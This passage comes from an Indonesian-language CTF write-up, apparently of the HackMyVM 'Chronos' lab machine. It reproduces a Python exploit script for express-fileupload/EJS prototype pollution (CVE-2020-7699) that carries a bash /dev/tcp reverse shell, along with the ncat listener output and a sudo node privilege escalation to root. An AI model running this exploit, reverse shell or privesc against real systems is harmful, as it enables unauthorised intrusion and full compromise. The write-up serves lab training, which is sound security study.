</span><span class="err">console.log('Server</span><span class="w"> </span><span class="err">listening</span><span class="w"> </span><span class="err">on</span><span class="w"> </span><span class="err">'</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">addr</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">'</span><span class="w"> </span><span class="err">port</span><span class="w"> </span><span class="err">'</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">port);</span><span class="w">
</span></code></pre></div></div>
<p>tidak tahu persis apa maksudnya, tapi saya dapat memahami bagaimana server ini berjalan. saya mencoba googling dan mendapatkan Exploit menarik untuk <a href="https://github.com/boiledsteak/EJS-Exploit">express-fileupload</a>. tidak lebih seperti dibawah ini.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##############################################################
# Run this .py to perform EJS-RCE attack
# referenced from
# https://blog.p6.is/Real-World-JS-1/
# 
# Timothy, 10 November 2020
##############################################################
</span>
<span class="c1">### imports
</span><span class="kn">import</span> <span class="nn">requests</span>

<span class="c1">### commands to run on victim machine
</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">'bash -c "bash -i &amp;&gt; /dev/tcp/192.168.56.1/2004 0&gt;&amp;1"'</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Starting Attack..."</span><span class="p">)</span>
<span class="c1">### pollute
</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://127.0.0.1:8080'</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">'__proto__.outputFunctionName'</span><span class="p">:</span> <span class="p">(</span>
    <span class="bp">None</span><span class="p">,</span> <span class="sa">f</span><span class="s">"x;console.log(1);process.mainModule.require('child_process').exec('</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">');x"</span><span class="p">)})</span>

<span class="c1">### execute command
</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1:8080'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Finished!"</span><span class="p">)</span>
</code></pre></div></div>
<p>konsep yang menarik untuk meng-exploit server lokal dan mengeksekusi reverse shell dan masuk ke shell si mesin attacker. and then look what i’ve done with it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@chronos:~/html<span class="nv">$ </span>python3 exploit.py
python3 exploit.py
Starting Attack...
Finished!
<span class="nt">---</span>
arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>ncat <span class="nt">-nvlp</span> 2004
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2004
Ncat: Listening on 0.0.0.0:2004
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:33712.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>772<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
imera@chronos:/opt/chronos-v2/backend<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>imera<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>imera<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>imera<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lxd<span class="o">)</span>
imera@chronos:/opt/chronos-v2/backend<span class="nv">$ </span>

</code></pre></div></div>

<h2 id="privesc">PrivEsc</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imera@chronos:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>imera on chronos:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User imera may run the following commands on chronos:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/npm <span class="k">*</span>
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/node <span class="k">*</span>
</code></pre></div></div>
<p>seperti biasa <a href="https://gtfobins.github.com/">GTFObins</a> selalu menyediakan metode untuk para pentester melakukan privesc.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imera@chronos:~<span class="nv">$ </span><span class="nb">sudo </span>node <span class="nt">-e</span> <span class="s1">'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'</span>
<span class="o">)</span><span class="s1">'do node -e '</span>child_process.spawn<span class="o">(</span><span class="s2">"/bin/sh"</span>, <span class="o">{</span>stdio: <span class="o">[</span>0, 1, 2]<span class="o">})</span>

<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://salmonsec.com/cheatsheet/reverse_shells">https://salmonsec.com/cheatsheet/reverse_shells</a></li>
  <li><a href="https://www.dcode.fr/base-58-cipher">https://www.dcode.fr/base-58-cipher</a></li>
  <li><a href="https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/">https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/</a></li>
  <li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
  <li><a href="https://github.com/boiledsteak/EJS-Exploit">https://github.com/boiledsteak/EJS-Exploit</a></li>
</ul>

  </div>
  <div class="post-info" style="padding-top: 25px">
    <div class="post-date">
      2021-09-16.
    </div>
    <div class="post-categories">
      <span></span>
      
      <a href="/category/hackmyvm" class="post-category">hackmyvm</a>
      
    </div>
    <div class="post-tags">
      <span></span>
      
      <a href="/tag/nodejs" class="post-tag">nodejs</a>
      
      <a href="/tag/express-fileupload" class="post-tag">express-fileupload</a>
      
      <a href="/tag/cve-2020-7699" class="post-tag">CVE-2020-7699</a>
      
      <a href="/tag/rce-poc" class="post-tag">RCE-PoC</a>
      
      <a href="/tag/base-56-cipher" class="post-tag">base-56-cipher</a>
      
    </div>
    <div class="post-tools">
      
      <div>
        <span></span><a href="/2022/05/01/hmv-ephemeral2">HackMyVM: Ephemeral 2</a>
      </div>
      
      
      <div>
        <span></span><a href="/2021/08/08/htb-love">HackTheBox: Love</a>
      </div>
      
    </div>
    
  </div>
</article>

    </main>
    <footer class="container-footer">
      <div class="footer-copyright">
  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
  <span class="footer-copyright-text float-right">
    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
  </span>
</div>

    </footer>
  </div>
</body>
</html>